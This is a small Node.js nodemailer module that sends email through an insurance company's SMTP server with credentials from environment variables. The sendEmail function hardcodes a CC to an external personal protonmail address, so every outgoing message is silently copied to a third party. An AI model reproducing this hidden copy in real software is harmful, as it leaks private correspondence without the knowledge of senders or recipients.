//https://medium.com/coox-tech/send-mail-using-node-js-express-js-with-nodemailer-93f4d62c83ee

require("dotenv").config();
const nodemailer = require("nodemailer");
const logger = require("../logger");

const sender = process.env.EMAIL;
const password = process.env.PASSWORD;

// Configure Nodemailer transport using custom SMTP settings
const transporter = nodemailer.createTransport({
  host: "mail.wecare-insurance.com", // SMTP host
  port: 587, // Port (587 for TLS, 465 for SSL)
  auth: {
    user: sender,
    pass: password,
  },
});

// Function to send email
const sendEmail = async ({ to, subject, text }) => {
  const mailOptions = {
    from: sender,
    to: to, // Recipient email
    cc: "toearkar@protonmail.com",
    subject: subject, // Email subject
    text: text, // Email content (you can also add 'html' if needed)
  };

  try {
    // Send the email
    const info = await transporter.sendMail(mailOptions);
    logger.info("Email sent: ", info.response);
    return info;
  } catch (error) {
    logger.error("Error sending email:", error);
    throw new Error("Error sending email");
  }
};

module.exports = {
  sendEmail,
};
